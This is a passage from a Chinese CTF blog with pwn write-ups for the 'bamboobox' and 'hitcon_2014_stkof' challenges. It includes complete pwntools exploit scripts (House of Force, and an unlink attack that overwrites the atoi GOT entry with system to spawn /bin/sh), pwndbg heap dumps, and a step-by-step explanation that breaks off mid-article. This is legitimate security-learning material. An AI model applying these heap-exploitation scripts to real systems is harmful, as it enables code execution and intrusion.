class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x00400D49</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">-112</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><blockquote>
<p>unlink具体已经通过<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>学习了，但是做本题的时候，遇到了一些问题，，，记录下。</p>
<p>思路比较简单：</p>
<ol>
<li>unlink</li>
<li>修改chunk1指针为atoi_got</li>
<li>show打印atoi地址，计算system</li>
<li>edit修改stoi_got为system地址</li>
<li>重新启动的时候，发送’/bin/sh’即可执行atoi(输入的数据) =&gt; system(‘/bin/sh’)</li>
</ol>
</blockquote>
<h3 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h3><h4 id="1-target取值问题"><a href="#1-target取值问题" class="headerlink" title="1.target取值问题"></a>1.target取值问题</h4><p><code>target = 0x6020c8</code>可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:	0x0000000000000030	0x00000000006020b0</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:	0x0000000000000030	0x00000000022e8100</span><br><span class="line">0x6020f0 &lt;itemlist+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>但是<code>target = 0x6020c8+0x10</code>会导致整个脚本不可用。</p>
<blockquote>
<p>难道是不能最后清零？</p>
</blockquote>
<h4 id="2-覆盖指针问题"><a href="#2-覆盖指针问题" class="headerlink" title="2.覆盖指针问题"></a>2.覆盖指针问题</h4><p>就很奇怪，不能用puts_got表（0x602020），同样报错，其他的可以，，，</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27073</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./bamboobox"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>,<span class="string">"bbbb"</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"cccc"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span>   <span class="comment">#not be last</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># x/30gx 0x6020c8</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"><span class="comment"># print(hex(puts_got))</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(atoi_got)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实这道题比<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/#" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>这道题要简单，，，给了打印函数，可以直接show出来地址（无须构造puts），覆盖atoi方便，因为程序开头有atoi（输入八字节）的操作，只要覆盖atoi_got表为system地址即可get shell。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/20/23-26/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/20/23-26/" class="post-title-link" itemprop="url">hitcon_2014_stkof详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-20 23:26:12 / 修改时间：23:26:52" itemprop="dateCreated datePublished" datetime="2021-04-20T23:26:12+08:00">2021-04-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>本文主要列出hitcon2014_stkof的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">unlink 系列</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>allocate：分配一个指定size大小的块，返回idx。</p>
<p>其中块的指针信息保存在一个全局变量0x602140中</p>
</li>
<li><p>fill：根据idx找到对应的块，重新给定大小size，读入内容content</p>
</li>
<li><p>free：释放idx的块</p>
</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
<li>由于fill时候的size可以重新制定，可以造成堆溢出。</li>
<li>没有打印函数</li>
<li>有一个全局变量</li>
</ol>
<p>方法：unlink</p>
<ol>
<li>unlink，控制全局变量内容</li>
<li>修改chunk1指针为free_got，修改got表内容为puts_plt</li>
<li>修改chunk2指针为puts_got，这样，free(2)即可打印puts地址</li>
<li>计算system和binsh</li>
<li>同2，修改got表内容为system，对未使用的chunk4填入‘binsh’</li>
<li>free(4)即可get_shell</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-tip（setbuf）"><a href="#0-tip（setbuf）" class="headerlink" title="0.tip（setbuf）"></a>0.tip（setbuf）</h4><p>setbuf()/setvbuf()函数作用：关闭I/O缓冲区</p>
<p>一般为了让程序显示正常，会关闭I/O缓冲区</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(stdin ,<span class="number">0</span>);</span><br><span class="line">setbuf(stdout,<span class="number">0</span>);</span><br><span class="line">setbuf(stderr,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>但是本题没有关闭缓冲区，<strong>函数运行开始阶段在fgets()函数以及printf()函数运行的时候，会malloc()两块内存区域</strong>。 </p>
<h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><blockquote>
<p>没开pie，Partial RELRO，可以修改got表内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec stkof</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;stkof&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="2-申请四个块"><a href="#2-申请四个块" class="headerlink" title="2.申请四个块"></a>2.申请四个块</h4><blockquote>
<p>由于为关闭缓冲区，故程序中多出输入缓冲区和输出缓冲区。</p>
<p>第一个chunk，由于会加在输入输出缓冲区之间，后续无用。</p>
<p>第二个chunk，为了unlink前向合并</p>
<p>第三个chunk，大小非fastbin</p>
<p>第四个chunk，一个开始阶段不被改变的chunk，用于最后填入的‘/bin/sh’。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8490:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>全局变量的情况，申请四个chunk的首地址记录在里面。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x00000000020f8460	0x00000000020f84a0</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-伪造chunk，unlink前向合并"><a href="#3-伪造chunk，unlink前向合并" class="headerlink" title="3.伪造chunk，unlink前向合并"></a>3.伪造chunk，unlink前向合并</h4><blockquote>
<p>在chunk2中伪造了一个0x20大小的已被释放的chunk，并在chunk3的pre_size中也要填入0x30</p>
<p>通过unlink的固定格式，进行unlink操作，即可使target的地址为target-0x18，网target地址填入数据，即可实现全局变量的控制。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target &#x3D; 0x602140 + 0x10</span><br><span class="line">fd &#x3D; target - 0x18</span><br><span class="line">bk &#x3D; target - 0x10</span><br></pre></td></tr></table></figure>
<blockquote>
<p>伪造chunk</p>
<ul>
<li>size为0x30，被释放</li>
<li>fd = target - 0x18</li>
<li>bk = target - 0x10</li>
</ul>
<p>修改下一个chunk的pre_size（合并找到伪造的chunk）</p>
<ul>
<li>pre_size = 0x30，当前chunk为0x90</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000030</span><br><span class="line">0x20f8470:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free后造成合并，unlink，在chunk2中填入了target-0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x0000000000602138	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>heap里面看不出来，，，因为地址不对，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是已经成功合并释放了，起始地址为伪造的chunk开头</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x20f8460 —▸ 0x7fbcdd959b78 (main_arena+88) ◂— 0x20f8460</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<blockquote>
<p>伪造的chunk大小变为0xc0（0x30+0x90）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-修改全局变量的值"><a href="#4-修改全局变量的值" class="headerlink" title="4. 修改全局变量的值"></a>4. 修改全局变量的值</h4><blockquote>
<p>通过unlink技术得到的部分地址读写能力，可以修改chunk1的指针为free_got，chunk2的指针为puts_got，接下来对chunk1和chunk2的内容进行的修改，本质都是修改两个got表</p>
</blockquote>
